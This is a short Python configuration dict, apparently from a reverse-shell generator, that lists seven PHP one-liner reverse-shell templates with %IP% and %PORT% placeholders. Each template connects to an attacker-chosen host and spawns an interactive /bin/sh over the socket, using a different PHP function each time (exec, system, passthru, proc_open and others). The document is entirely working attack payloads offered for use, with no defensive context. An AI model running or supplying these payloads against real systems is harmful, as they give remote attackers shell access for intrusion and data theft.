conf = {
    "name": "php",
    "templates": [
        "php -r '$sock=fsockopen(\"%IP%\",%PORT%);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "php -r '$sock=fsockopen(\"%IP%\",%PORT%);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "php -r '$sock=fsockopen(\"%IP%\",%PORT%);`/bin/sh -i <&3 >&3 2>&3`;'",
        "php -r '$sock=fsockopen(\"%IP%\",%PORT%);system(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "php -r '$sock=fsockopen(\"%IP%\",%PORT%);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "php -r '$sock=fsockopen(\"%IP%\",%PORT%);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'",
        "php -r '$sock=fsockopen(\"%IP%\",%PORT%);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
    ]
}